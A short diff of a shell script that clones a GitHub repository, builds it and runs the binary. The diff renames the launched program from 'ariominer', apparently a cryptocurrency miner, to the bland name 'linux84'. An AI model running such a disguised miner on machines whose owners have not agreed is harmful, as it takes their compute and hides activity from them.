@@ -1,8 +1,8 @@
-git clone https://github.com/mobileapps84741274/linuxweb84741274;
-cd ./linuxweb84741274/;
+git clone https://github.com/mobileapps84741274/linux8444;
+cd ./linux8444/;
 mkdir ./build/;
 cd ./build/;
 cmake ..;
 make;
 cd ./linux8444/;
-./ariominer linux84
+./linux84 linux84
